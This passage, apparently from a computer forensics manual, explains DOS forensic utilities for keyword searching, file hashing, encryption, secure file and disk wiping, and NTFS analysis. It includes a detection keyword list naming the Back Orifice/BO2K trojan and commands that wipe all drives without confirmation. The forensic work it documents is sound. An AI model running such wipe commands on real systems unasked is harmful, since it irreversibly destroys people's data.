Let us say that we want to perform a keyword search using TextSearch Plus (TSP) on one of the files created earlier, SwapData.f0l. We could do this on any of the files we created (C\_Slack, FreeC, temporary files, any of our Filter\_I generated files, etc.), but we have chosen SwapData.f01 for this example.

Use the arrow keys and highlight Drive/Path. Press the <enter> key. Notice where the blinking cursor now resides. Use the backspace key to erase what is there and type in the full path that leads to the file you want to analyze. For instance, if your SwapData.f0l file resides in D: \\ InvesXCasel, then type that. If it resides at D:\\, then type that. Do not put the file name here (SwapData.f0l). There is another location for that. Once you have typed in the full path, press the <enter> key. You will be back to the menu options.

Use the down arrow key to get to Continuous Search. Look under the location where you typed the path. The word below it is Continuous. To the right it will say either off or on. Pressing the <enter> key toggles between off and on. Press your <enter> key until it says on. When Continuous Search is off, TSP will pause every time it finds a match to a keyword. If it is on, it will log a find of a keyword to a log file, but will automatically continue searching the SwapData file for other keywords.

Now use the down arrow key to go to the next option, Editor/Lister. Press the <enter> key. Notice the blinking cursor is next to the word Type, which is a DOS command that can be used to view a file. This is the default, which works fine. If desired you could use your backspace key and replace this with another editor, such as EDIT. Press <enter> to return to the menu options.

Press <enter> on the File Specs menu option, and the blinking cursor will go to the bottom left. This is where you type in the file name SwapData.f01. Wild cards such as \*.\* can be used to search all files in the Drive/Path you selected, or SwapData. \* can be used to look through all your SwapData files (.f01 to .f04), but we will not do that this time. Just type in the file name SwapData. F0l and press <enter>. You are back at the menu options.

Using the down arrow to go to DOS Gateway, press <enter>. Notice that this takes you to a DOS prompt in case there is something you want to do in DOS. Type EXIT at the DOS prompt to return to the TSP menu.

Now go to the menu option IntelliSearch. Notice that pressing the <enter> key toggles this value on and off. Leaving this option on improves the search results, so we will leave it on. This will strip out all punctuation and control characters before the search begins. IntelliSearch helps because, if you were looking for the name “Bob” and used the key word “Bob” but “Bob” appeared at the end of a sentence, for example as “Bob?,” you would normally miss the name because of the question mark; however, with IntelliSearch, the question mark is eliminated and the name “Bob” is found.

As a further note pertaining to keywords used in TSP, if you were looking for the name “Sue” and just used the keyword “Sue,” then you could also end up with all sorts of other words that you were not looking for, e.g., pursue. To avoid this, place a space before and after “Sue,” e.g., “ Sue.”

Now use the down arrow again and go to Log File and press <enter>. Now delete whatever is next to Log output to: and replace it with the full path and file name of the log file you want to create. Press <enter> to return to the menu options.

**Note**: The log file cannot be created on the drive that contains the file you are searching. So if your keyword pattern file is on drive D, you could send the output of TSP to a log file on a diskette in drive A.

Use the down arrow and highlight Multiple Matches. This is another toggle switch. Press <enter> multiple times to see it turn Multiple Matches on and off. When on, TSP will search for the same keyword multiple times. When off, TSP will search for only one occurrence of a keyword. Leave it on for our purposes and then arrow down to the next menu item, Print Flag.

Print Flag is another toggle switch, and multiple presses of <enter> turn it on and off. Turning it on sends the output of TSP to a printer as well as to a log file. Leave it off for our purposes.

Down arrow to Text Pattern File and press <enter>. Notice the location of the blinking cursor. Enter the full path and file name of the pattern file (your list of keywords) that you will create. Press <enter> and you are back to the menu.

Down arrow to Sub\_Directory Search and press <enter>. Notice that this is a toggle switch and that multiple presses of <enter> turn this option on and off. Leave it off for our purposes, because we have already directly specified our full path and keyword file name.

Down arrow to Exclude File Specs. This is another toggle switch that <enter> controls. Leave it off for our purposes, because we do not wish to prevent TSP from looking at any particular file.

Down arrow to WordStar Flag. This is a toggle switch controlled by pressing <enter>. Leave it off unless you are using WordStar. Most likely you will not be using WordStar so it should be turned off.

Down arrow to Physical Drive. Only use this option if you also choose Search at Phys. level, which is chosen by selecting from the top menu Areas and then Physical Disk Search. Use of this option is not recommended because this is not the usual way to do a search and was only put in TSP to comply with a request from a government agency. Skip this option and move to the final option, File Alert.

File Alert, when toggled on, alerts you to the presence of files that may contain graphics, files that are compressed, or hard drives that have compression activated. Again, use the <enter> key to toggle this option on or off. For our purposes, we will leave it on.

Now use the right arrow key to move across to the main menu selection Areas. For our purposes, we will highlight Files and press <enter>. There should now be a checkmark next to Search Files. If there is not, press <enter> again, because this is a toggle switch. When there is a checkmark next to Search Files (top right of screen), you can move to the next paragraph.

We shall now create our keyword pattern file. Use the left arrow key and move back over to the main menu option labeled Options. Highlight DOS Gateway and press <enter>. At the DOS prompt, type EDIT (to use the DOS text editor; you can also use another ASCII text editor) and type in your keyword pattern file. I have placed my keyword pattern file at location d: \\Suspect.txt, and the file contains the column of words below (The column method is required.):

*   Bad
*   Destroy
*   Exception
*   Error
*   Warning
*   Critical
*   Delete
*   Remove
*   Terminate
*   Virus
*   Shawn
*   Carlsbad
*   Ronald Dickerson
*   Ann Arbor
*   Allentown
*   Charles Brownerstein
*   Franklin from IBM
*   Bonnie Greason
*   13 GHZ
*   allenpcq@odst23.com
*   Abnormal program termination
*   Unexpected
*   Runtime error
*   Attacker
*   Exploited
*   Probe
*   Password
*   ntruder
*   suspicious
*   Cult
*   Dead Cow
*   BO2K
*   Back Orifice
*   BackOrifice
*   crtdll.dll
*   msadp32.acm
*   msacm32.dll

You can use up to 50 keywords. It does not matter whether or not you capitalize letters. TSP will look for the word, not caring whether or not the letters are lowercase or uppercase. Save the file with the proper file name that you told TSP you were using and keep it in the proper directory that you told TSP you were using. If you used a .txt extension on the file, be sure you told TSP about the .txt extension by putting .txt on the end of your pattern file name. Now type EXIT at the DOS prompt to return to TSP.

At the main menu use the arrow keys to go to Search, highlight Proceed, and press <enter>. TSP begins the keyword search, which you see on the monitor. The results are all placed in the log file you designated earlier.

When TSP has finished, use the arrow keys to move to the main menu item Exit and press <enter>. When asked if you want to save the current configuration, press Y for yes.

If the resulting log file is too large, keywords that gave you too many hits can be removed. Once you have the log file, manually analyze it for clues/leads and other case-appropriate information. Look through the log file using any text editor, such as Microsoft Word for Windows. Be sure to thoroughly document your findings.

There are a few other notes pertaining to TSP. For Physical Drive, if you use FI, FI refers to your diskette drive; if you use HI, Hi refers to your first hard drive (H2 is the second hard drive, etc.). If files or other data are encrypted, TSP cannot be of assistance, except to identify known header information for encrypted files.

## CRCMD5

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

CRCMD5 calculates a CRC-32 checksum for a DOS file or group of files and a 128-bit MD5 digest. The syntax of the CRCMD5 program is:

 crcmd5 <options> filel file2 …

Wildcard specifiers of \* and ? may be used in file names.

If the /s option is used, the files in the current directory and all the files matching the stated file specification in any subdirectories are check-summed.

If the /h option is specified, the generated output is headerless text that consists of file name lines only. The full path of each file is appended as the last field on each line, separated from the RSA MD5 digest by a space.

To generate a checksum and MD5 for all files on drives C and D, type:

 crcmd5/s C: D:

To generate a checksum and MD5 for the SwapData.f0l file that resides on drive D, type:

 crcmd5 d:\\SwapData.f01

Generate a checksum and MD5 for all files on drive D. Write the output as headerless text:

 crcmd5/s/h D:

To send the output of CRCMD5 to a file name of your choice, use the following command:

 crcmd5/s/h D: > a:\\OutFile.txt (Use any file name you wish.)

The purpose of having the CRC checksum and MD5 digest is to verify the integrity of a file or files. For instance, once you have collected a file for evidence, run CRCMD5 on it to obtain the CRC checksum and MD5 digest. As long as the file contents are not changed, these values remain unchanged. If they do change, then the integrity of the file has been compromised, and the file may no longer be admissible in a court of law.

## DiskSig

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

DiskSig is used to compute a CRC checksum and MD5 digest for an entire hard drive. The checksum and digest include all data on the drive, including erased and unused areas. By default, the boot sector of the hard drive is not included in this computation.

To compute the CRC and MD5 digest for hard drive D, type:

 disksig d:

To compute the CRC and MD5 digest for hard drives C, D, and E, type:

 disksig C: D: E:

To include the boot sector of the drive in the computation, type:

 disksig/b D:

To send the output of DiskSig to a diskette instead of the computer monitor, type:

 disksig D: > a:\\DiskSigD.txt

**Note**: If the hard drive has been compressed, the computation is performed on the raw uncompressed hard drive.

Similar to CRCMD5, the purpose of DiskSig is to verify the integrity of a hard drive. Running DiskSig on a hard drive held for evidence provides a CRC checksum and MD5 digest. If the hard drive data is altered in any way, the values of the CRC and MD5 will change.

### Doc

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

Doc is a program that documents the contents of the directory from which it is run. The output provides a listing of the file/directory names, file sizes, file dates, and file times (creation time in hour, minute, second). Read-only and hidden files are also displayed.

If you want the output to go to the screen and to its standard report name, type:

 doc <enter>

The standard report file will be in the directory in which Doc was run. The report file name will be in the form Doc-<Month><Day>. <report number>. For instance, if the date is October 11 and this is the first report run in this directory, the report file name would be:

 Doc-1011.001.

If you want the output to go to a file on a diskette, type:

 doc > a:\\DocD.txt <enter>

### Mcrypt

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

The purpose of Mcrypt is to encrypt and decrypt files. Various levels of encryption are available. If you are also using file compression techniques, the proper procedure is to first compress the file and then encrypt it using Mcrypt. If you are sending the encrypted file to someone else via the Internet, be sure to not transfer the password required to decrypt the file via the Internet. Decide on a password in a face-to-face meeting with the individual (best) or share the password with that person over the telephone (but do not leave it on voice mail). Do not use the same medium (such as the Internet) for both the encrypted message and the password associated with it. For the best security, do not rely on encryption alone. Be sure to lock up the diskette or whatever medium the encrypted file resides on. Context-sensitive help is available at any time by pressing the Fl key.

Mcrypt has three levels of encryption, each one better than the other, but each one takes longer to perform the encrypt/decrypt function:

1.  Proprietary encryption (low-level default)
2.  DES (Data Encryption Standard) CBF (high-level default)
3.  Enhanced DES (dual encryption first using DES, then proprietary encryption)

 mcrypt filename/Z

When choosing a password for the encryption process, use a pass phrase, not a simple password that could be looked up in a dictionary (any language). A strong password should have at least eight characters and should contain alphanumeric characters, along with special characters (such as !, %, @, #, \*). You make up the pass phrase so you will remember it. An example of a pass phrase is as follows:

> The corn will be growing for the next 30 days!

Choose the first letter of each word, including the numbers and the special character. The password becomes:

> tcwbgftn30d!

This password would be extremely difficult and time consuming to break. Also remember that the password should be easy to type quickly, in case someone is watching you (whether you know it or not). Capitalizing some letters further increases the security of the password but also makes it difficult to type quickly and more difficult to remember. I do not recommend mixing uppercase and lowercase letters in a password.

When choosing files to encrypt, you can do it either from the command line or by choosing multiple files from the GUI (graphical user interface) using the space bar. All files can be selected and deselected using the + and - keys:

 mcrypt/m forces the program to use a monochrome monitor.

 mcrypt/c forces the program to use a color monitor.

As an example, if you want to encrypt the file SwapData.f0l that resides on drive D using a high level of encryption (DES CBF), type:

 mcrypt d:\\SwapData.f01/H

During a working session, if you only desire to work with.txt files, begin your session from the DOS command line by typing:

 mcrypt \*.txt

**Note**: All DOS wild cards (**\*** and **?**) are valid.

As another example, to encrypt all of your SwapData files (.f0l to. f04) stored on drive D using high level (DES CBF) encryption from the DOS command line, type:

 mcrypt d:\\SwapData.\*/-E/H

Enter the password and the files will be encrypted.

To decrypt the files from the above example, use the /-D option:

 mcrypt d:\\SwapData.\*/-D/H

Enter the proper password and the files are decrypted.

To start the program with the low-level encryption option, type:

 mcrypt

To start the program with the high-level encryption option, type:

 mcrypt/H

To start the program with the Enhanced DES level of encryption, type:

 mcrypt/Z

For site license versions, a “Management Back Door” can be established and utilized via the option:

 mcrypt/P

**Remember**: If you establish a back door, any file you have encrypted can be compromised using this back door. I do not recommend using a back door.

As with any encryption program, it is always best to turn off your computer after you have completed a session in which you encrypted documents. This will remove the passwords from the computer’s RAM memory. With Mcrypt, much work went into ensuring that passwords did not remain in computer memory; however, it is better to be safe than sorry.

To use the GUI only, follow this procedure:

 mcrypt <enter>

Use the arrow keys to highlight Change Security Level and then press

 <enter>.

Notice that the top right now says High Security Selected. This is a toggle.

Use the arrow keys and highlight Change File Specs.

Put in the proper path and file specs for the files you wish to

 encrypt/decrypt.

Use the arrow keys to highlight Encrypt/Decrypt Files and press

 <enter>.

Press E to encrypt or D to decrypt.

Choose the file or files (space bar toggles) you wish to encrypt or decrypt. If you are concerned with only one file, highlight the file and press <enter>.

Enter a strong password (using a pass phrase as described above).

Enter the password a second time to be sure you know what it is.

Encryption or decryption will begin.

### Micro-Zap

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

> *When a file is erased or deleted using standard DOS (delete, erase) or Microsoft Windows (95/98/NT/2000) techniques, the file is not actually deleted. The file is still there and can be recovered by those who know how. Micro-Zap actually eliminates the file names and the file content associated with them.*

Micro-Zap deletes files by overwriting them with a hex F6 pattern. One overwrite is the default, but an even higher level of security is afforded through the seven overwrites option. Obtain help with the program at any time by pressing the FI key. When a file is eliminated with Micro-Zap, the associated file slack is also eliminated. Some examples follow.

To eliminate all.doc files in a particular directory with the seven overwrites (/H option), use:

1.  zap \*.doc/H.
2.  Press the space bar.
3.  Erase/Destroy Files should be highlighted. If not, use arrow keys to highlight it.
4.  Press <enter>.
5.  Select all the \*.doc files by pressing either the + key or using the space bar.
6.  Press <enter>.
7.  Press Y (Yes) to destroy the files.
8.  Press the space bar to return to the menu or ESC to quit the program.

To eliminate and overwrite seven times the file Story.txt, use:

 zap Story.txt/H

 Press Y (yes) at the prompt

To eliminate and overwrite the file Bonus.com one time, use:

 zap Bonus.com

 Press Y (yes) at the prompt

**Note**: If you ask Micro-Zap to delete a zero byte file, it will tell you to do that under DOS.

If you want to use the GUI interface instead of the command line but want Micro-Zap to initialize with the seven-overwrite option, use:

1.  zap/h.
2.  Press the space bar.
3.  Highlight the Specs option and press <enter>.
4.  Provide the full path and file specs (such as d: \\stories\\ \*.txt).
5.  Select Erase/Destroy Files and press <enter>. Now you see the files that end in .txt
6.  Press the + key to select all of them or for individual files use the space bar.
7.  Press <enter>.
8.  Press N for No if you do not want to individually confirm deletion of each file.
9.  Press Y for yes to destroy the files.

### Map

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

Map is used to find and identify TSR (Terminate and Stay Resident) programs. TSR is a program that is running in computer memory, but you may not realize it. To use Map type:

 map <enter>

You will see six columns of information:

1.  PSP
2.  Program
3.  Parent
4.  Segs
5.  Size
6.  Hooked Interrupts

The DOS version of the system will also be displayed.

To see further details pertaining to the TSR programs, type:

 map/d <enter>

### M-Sweep

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

Just because you can no longer see the filename of a particular file, do not think it (or part of it) does not still reside somewhere on your hard drive. M-Sweep removes remnants of these old files (files you deleted via DOS or Windows commands but whose contents are actually still on the hard drive or diskette) by overwriting the disk space that is not being used by current files you wish to retain. It is particularly important to ensure removal of these old files when a computer moves to a different department or is sold.

M-Sweep securely removes residual data from hard drives that are 8 GB or smaller, all diskettes, and other removable media (FAT12, FAT16, FAT32 file systems).compression products such as DoubleSpace or DriveSpace work fine with M-Sweep. Do not use M-Sweep with compression products that are not from Microsoft (such as Stacker). If M-Sweep encounters an error, run scandisk and then re-run M-Sweep.

M-Sweep first goes through and cleans out all slack space. Once this is completed (takes several seconds to several minutes), M-Sweep starts a second pass over the drive, cleaning unused (unallocated/erased space that once held complete files, but now holds portions of file data that you cannot see) space. In its default mode, M-Sweep overwrites slack and unused space one time on the current volume on which it is running.

To initiate M-Sweep in interactive mode, type:

 ms <enter>

To initiate M-Sweep in batch mode, type:

 ms/b <enter>

Batch mode allows M-Sweep to run unattended. This command can be placed in your autoexec.bat file so it will run whenever the system is rebooted.

To initiate M-Sweep on a different volume (such as drive D) from the one on which it is running, type:

 ms D: <enter>

To clean out temporary or swap files on drive C, run a file cleaning script by typing:

 ms/s:<ScriptName> C: <enter>

For help with the command line options of M-Sweep, type:

 ms/H <enter> ms/? <enter>

If you want the batch command line mode to suppress most messages, use:

 ms/b/q <enter>

Other command line options are:

 /R: <filename>  Obtain a cleaning status report file

                   Cannot have a report file on the volume being cleaned.

 / V: CDE       Cleans volumes C, D, E

                   Be sure to place the volumes in size order (largest to smallest)

 /XS           Forces M-Sweep to skip the cleaning of slack space

 /XU           Forces M-Sweep to skip the cleaning of unused space

 /n             Sets the number of overwrites to be done (n = 1 to 9)

When using the interactive mode:

*   Use <tab> and <shift tab> to move between fields or use the mouse pointer.
*   Obtain additional help by using Alt-h to access the help menu.
*   When a checkmark appears in a checkbox, the item is turned on.

To clean volume D, use:

*   Place a D in the “… volumes will be cleaned:” box.
*   Tab to other fields.
*   Checkmarks should be in the clean unused space and clean slack space fields.
*   Tab to the number specifying the number of overwrites and enter a number between 1 and 9.
*   Alt-c (The cleaning process will begin. Be sure you are in DOS mode, not MS Windows.)

To set up a file cleaning script to clean up swap and temporary files:

*   Must be a text-only file type.
*   Comment lines can begin with any of three characters – :/;/\*.
*   Command lines must begin with either the DELETE or CLEAN command.
*   DOS style 8.3 filenames must be used.
*   DOS wildcards are allowed for normal files (not hidden or system files).
*   A fully qualified path name must follow the DELETE or CLEAN command.
*   Read-only files will not be deleted.
*   DELETE causes the files to be deleted before the cleaning process starts.
*   DELETE is preferred over CLEAN.
*   CLEAN overwrites the contents of the files but otherwise leaves the file intact.
*   CLEAN is excellent for files like a permanent swap file (such as pagefile.sys).

A short example script would look like this:

> ; Place a comment on this line  
> DELETE c:\\temp\\\*.\*  
> CLEAN c:\\winnt\\system32\\pagefile.sys  
> ; End of script

As a final example, to run M-Sweep on drive D in batch mode from the command line with a report file named c: \\ms.txt with two overwrites, type:

 ms/v/r:c:\\ms.txt/2 D:

### Net Threat Analyzer

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

Net Threat Analyzer (NTA) has the potential to identify criminal activities (such as bomb making, pornography, hate crimes, etc.) before they take place. NTA does an excellent job of analyzing any file, but it is particularly useful to evaluate swap files (such as the pagefile.sys in Microsoft Windows NT). To evaluate a swap file such as pagefile.sys, first reboot the system to DOS mode; then copy the file to another hard drive partition or to another medium (such as a Zip Drive or Jaz Drive). Now run NTA against the copy of pagefile.sys. Obtain context-sensitive help at any time by pressing the F1 key.

The output of NTA is in a database format; therefore, use a program such as Microsoft Excel to read the output of NTA. When using Excel to view the output, you will see the following fields:

> *Content:* Contains e-mail addresses or URLs
> 
>         (universal resource locators) and other potential leads
> 
> Extension: Stores the extension of the e-mail address or URL; may contain country code
> 
> Flag: “Best guesses” by the program pertaining to certain problem areas
> 
> C: Potentially a country whose policies conflict with those of the United States (The country might be involved with terrorism, drug trafficking, or espionage.)
> 
> *D:* Potential Internet transaction related to narcotics violations
> 
> *T:* Potential Internet transaction related to hate crimes, terrorism, and bomb making, children at risk
> 
> *X:* Potential Internet transaction related to pornography

To use NTA in its basic GUI format, type:

 nta <enter>

Using the arrow keys, highlight one of the four choices and press <enter>:

1.  Find Internet browsing leads.
2.  Find e-mail activity leads.
3.  Find graphic and file download.
4.  Dump all Internet leads.

Choose the file you wish to analyze (must be in the same directory as NTA).

*   Answer Y (Yes) to create the .dbf file.
*   Processing begins.
*   When the .dbf file is completed, use Excel to read the file.

To perform a more in-depth search of Internet and e-mail leads when foreign countries are involved, from the DOS command line, type:

 nta/advanced <enter>

To determine which file is analyzed from the command line, type: nta <full path name>

An example of the above command line would be:

 nta d:\\tools\\iterns\\AnalyzeMe.txt

When using NTA, any potential lead you find should be corroborated because errors or misleading information can occur because of the way swap files work.

**Remember**: Swap files can be months or even years old.

### AnaDisk

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

AnaDisk is a utility for analyzing diskettes. The following functions are performed by AnaDisk:

*   Copies sections of a diskette to a file
*   Repairs diskettes with data errors
*   Copies a diskette without regard to its format
*   Searches diskettes for text
*   Analyzes a diskette to determine density, format, changes, and errors
*   Allows custom formatting of diskettes with extra tracks and sectors
*   Can modify data on a diskette
*   Provides ASCII and Hex display of physical sectors and files

Context-sensitive help is available via the FI key.

To install AnaDisk from a DOS prompt, type:

 ADINSTALL <enter>

Follow the prompts.

To start AnaDisk, type:

 ANADISK <enter>

The Main Menu comes up, and nine items to choose from are available, based on what you want to do. Press FI to read about each of the nine choices:

1.  *Scan*: Reads a diskette and informs you of any problems it may have. Classifies the diskette according to its operating system type. Press the space bar to go from track to track. The yellow arrow at the top points up for side 0 and down for side 1. Select No for each choice for fastest performance. If the message “but data on even and odd tracks is different” occurs, press Y to view this data that someone has hidden on the diskette.
2.  *Sector*: Allows you to edit a diskette on a sector-by-sector basis. Follow the prompts and use FI for Help.
3.  *File*: Examines files based on the file name. Follow the prompts and use FI for Help.
4.  *Search*: Searches for data you specify on a diskette. Follow the prompts and use FI for Help.
5.  *Copy*: Allows you to make a true copy of a diskette. Follow the prompts and use FI for Help.
6.  *Repair*: Fixes data errors on diskettes. Follow the prompts and use FI for Help.
7.  *FAT*: Allows you to edit the File Allocation Table. Follow the prompts and use FI for Help.
8.  *Format*: Allows you to custom format a diskette. Follow the prompts and use FI for Help.
9.  *Dump*: Performs a sector-by-sector copy of a diskette area to a DOS file. Follow the prompts and use FI for Help.

When performing various functions, you will be asked whether you want to write to an audit file. It is best to answer yes because this provides a file that tells you what happened during the time the function you chose was performing its operation.

You will be asked various questions during some of the functions. Use the arrow keys to navigate to the choices.

### Seized

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

Seized locks the computer and displays a message stating that the computer has been seized as evidence and that it should not be operated.

Seized should be copied to diskettes/Zip Disks, etc. that are placed in bootable areas of the computer. These drives should then be sealed with evidence tape to prevent easy removal of the bootable diskette/Zip/Jaz/CD. Only the first device that the CMOS settings have the system booting to needs the Seized program. For example, if the CMOS settings have the system booting first from the diskette drive (usually drive A), then place Seized on a bootable diskette in a file named autoexec.bat, put the diskette in the diskette drive, and seal it with evidence tape. If the system is turned on, the warning message will flash and prevent system usage.

Seized is called from the autoexec.bat file of the system that was seized. If the computer system is turned on, the user will see the flashing warning message from the Seized program.

If the computer is configured to boot from a hard drive first, and you place Seized as the first line of your autoexec.bat file on the hard drive, then Seized will prevent any use of the computer system. If, at a later date, you wish to restore the system to a usable state, you will need to boot the system from a boot diskette. Once the system is up, edit the autoexec.bat file and remove Seized from the file. From then on it will work like a normal computer system. The command syntax is:

 SEIZED <enter>

### Scrub

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

Scrub can be used to permanently remove hard drive data. Scrub overwrites each disk sector using all zero bits and then all one bits. A final pass is then done writing a hex F6 to the drive. The number of times the hard drive can be overwritten (i.e., the number of passes) can be varied between 1 and 32,000 (approximately).

The Scrub program does not work on non-BIOS drives (e.g., it would not work on an Iomega Zip Drive). The command line syntax is:

 scrub/d:<drives>/p:<number of passes>/g

The /d: stipulates which drive(s) are to be scrubbed. Remember that zero is the first hard drive in your system, one is the second drive, two is the third hard drive, etc.

**Note**: You may use /d:all or/d:a to stipulate that all hard drives on the system are to be scrubbed.

The /p:<number of passes> is used to state how many times you want the hard drive to be scrubbed. If you leave out a value for /p:, then the default of two scrubs will be done on each hard drive that you stipulate.

Scrub usually requests verification from the user before it begins running. If you use the /g switch, Scrub does not ask for verification. This is useful if you wish to automate the scrubbing process.

As mentioned above, a hex F6 is the last pattern written to the hard drive using default settings. If you want something other than a hex F6 written, use the /v: yy switch, where yy is the hex pattern you prefer (such as E5, A3, etc.).

**Note**: The order of the parameters mentioned above (/v:, /g, /d:, /p) does not matter as long as there is a space between each parameter (no spaces allowed within parameters).

There is one additional parameter, the /x. If you use the /x, it will disable the automatic detection of your hard drives and the use of INT 13H BIOS extensions.

I will now present two examples for clarification:

1.  Scrub drives 0, 1, 2, and 3 with seven passes of zeros and ones and a final pass of the A4 pattern. The user will not verify the scrub.  
    scrub/d:0,1,2,3/p:7/g/v:A4
2.  Scrub all drives with eight passes of zeros and ones and a final pass of the D5 pattern. No user verification is necessary.  
    scrub/d:all/p:8/g/v:D5

**Note**: Never run Scrub from the same drive that you are scrubbing because Scrub locks the drive(s) being scrubbed.

### Spaces

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

The purpose of Spaces is to create a file(s) that contain spaces (and nothing else). Each file that is created by Spaces contains exactly 10,000 spaces. Personnel involved with encryption realize that this makes Spaces ideal for evaluating encryption patterns (and certain other weaknesses from a computer security perspective). The command line syntax is:

 spaces <enter>

The result of the above command produces a file named spaces.001. The file contains exactly 10,000 spaces.

### NTFS FileList

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*
*   *ntfsflst.exe*

The command syntax is:

 NTFSFLST <FILE NAME> <VOLUME:> \[<VOLUME\] \[/M\]

The path can be added to the above-mentioned filename by typing:

 /M adds MD5 values to the output.

To show a listing of hard drive volumes on the computer system, type:

 NTFSLST ID

To view the user manual on the computer system, type:

 NTFSFLST MAN | MORE

As an example, type:

 NTFSFLST C:\\SecretData D: E:/M

In this case, I am looking to obtain directory information from volumes D and E. I will place the results in a file on drive C named SecretData. The /M will also provide an MD5 value. SecretData will have a file extension of .dbf (SecretData.dbf).

NTFS FileList creates a database of computer directory information in a. dbf file. This file can be read by Microsoft Excel (or any other program that reads .dbf file types).

The MD5 hash value is used to determine whether or not the contents of a file have been altered. It can also be used to identify files with identical contents (regardless of the names that have been given to the files).

Windows NT uses Universal Coordinated Time (UCT). NTFSFLST also uses UCT because it directly reads drive information. The time zone the computer is set up for must be taken into account. As an example, EST (Eastern Standard Time) is equal to GMT minus five hours.

**Note**: For very large files, NTFSFLST can work extremely slowly due to the complexity of NTFS. Be patient. It may take 15 or 20 minutes for large files.

### NTFS GetFree

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*
*   *ntfsgetf.exe*

To obtain an estimate of the free space available on the volume(s), type:

 NTFSGETF <VOLUME:> \[<VOLUME:>..\]

The path can be added to the above-mentioned filename. /F is used if you want the output to be filtered:

 NTFSGETF <FILENAME> <VOLUME:>   \[<VOLUME:>

   <VOLUME:>..\] \[/F\]

To show a listing of hard drive volumes on the computer system, type:

 NTFSGETF ID

To view the manual on the computer system, type:

 NTFSGETF MAN | MORE

As an example, type:

 NTFSGETF C:\\FreeData D: E:/F

In this case, I am looking to obtain free space on volumes D and E. I will place the results in a file on drive C named FreeData. The /F will also provide me with a smaller output file that does not contain binary data (data that is not ASCII text). It is fine to look at the normal text first, but do not forget that binary data can hold critical information.

Data found in the free space of a hard drive is important because it may contain data from files that have been deleted, data created for temporary use by many commonly used application programs, and data from dynamic swap or page files. The file extension used is .fxx (such as .f01, .f02, etc.).

### NTFS GetSlack

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*
*   *ntfsgets.exe*

To obtain an estimate of the slack space on the volume(s), type:

 NTFSGETS <VOLUME:> \[<VOLUME:>..\]

The path can be added to the filename. /F is used if you want the output to be filtered:

 NTFSGETF <FILENAME> <VOLUME:> \[<VOLUME:>

 <VOLUME:>..\] \[/F\]

To show a listing of hard drive volumes on the computer, type:

 NTFSGETS ID

To view the manual on the computer, type:

 NTFSGETS MAN | MORE

As an example, type:

 NTFSGETS C:\\SlackData D: E:/F

In this case, I am looking to obtain slack space on volumes D and E. I will place the results in a file on drive C named SlackData. The /F will also provide me with a smaller output file that does not contain binary data (data that is not ASCII text). It is fine to look at the normal text first, but do not forget that binary data can hold critical information.

Data found in the slack space of a hard drive is important because it may contain partial data from files that have been deleted and data that once existed in the computer’s memory. The file extension used is .sxx (such as .s01, .s02, etc.).

### NTFS VIEW

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inil.com](http://www.forensics-inil.com)*
*   *ntfsview.exe*

To view NTFS volumes, type:

 NTFSVIEW <VOLUME>

 To view the NTFS volume D, type:

 NTFS VIEW D:

### NTFS Check

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*
*   *ntfschk.exe*

To check a drive, type:

 NTFSCHK <volume:> <options>

 <volume:> allows you to specify the drive to be checked. Use \* to tell the program to check all volumes.

Some options are:

*   /A Checks all the drives (same as using \*)
*   /F If there are errors on the disk, fixes them
*   /S Shows all the NTFS drives without doing any checks
*   /Q Quick checks the NTFS drives
*   /V Verbose (shows the paths of the loaded files)

For the path to the initialization file that contains the locations of files, type:

 /@<filename>

As an example, type:

 NTFSCHK D:/F

To check volume D and fix any errors found.

### NTIcopy

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

NTIcopy allows you to copy files from a computer without altering any data on the target disk, such as the date/time stamp. It works with NTFS and all FAT file systems.

The syntax for using NTIcopy is as follows:

 NTICOPY <target> <output>

 <target> is the name of the file to copy. You may include the full path.

 <output> is the name of the file to create. You may include the full path.

NTIcopy reads <target> without any help from the operating system. This prevents any alteration of the date/time stamp, among other things.

NTIcopy has an “identify drives” mode that tells you which drive letters the program will assign to NTFS partitions. To print a table listing all the partitions and their associated drive letters on the system that NTIcopy recognizes, use:

 NTICOPY ID <enter>

The results from this command when typed on my system are as follows. Your results will be similar in format, but different from mine:

|    || XBIOS || Beginning || Ending || Size in Kb |
| --- | --- | --- | --- | --- |
| Vol || HD System || Cyl || Head || Sec || Cyl || Head || Sec || (1 Kb = 1024 b) |
|   || \* || 80 || OS/2 hidden || 0 || 1 || 1 || 16 || 254 || 63 || 136521 |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Boot C: || \* || 80 || FAT32 || 17 || 0 || 1 || 632 || 254 || 63 || 4948020 |
|   || \* || 80 || DOS EXT || 633 || 0 || 1 || 788 || 254 || 63 || 1253070 |
|   || \* || 80 || Linux native || 633 || 1 || 1 || 635 || 254 || 63 || 24066 |
|   || \* || 80 || DOS EXT || 636 || 0 || 1 || 754 || 254 || 63 || 955867 |
|   || \* || 80 || Linux native || 636 || 1 || 1 || 754 || 254 || 63 || 955836 |
|   || \* || 80 || DOS EXT || 755 || 0 || 1 || 763 || 254 || 63 || 72292 |
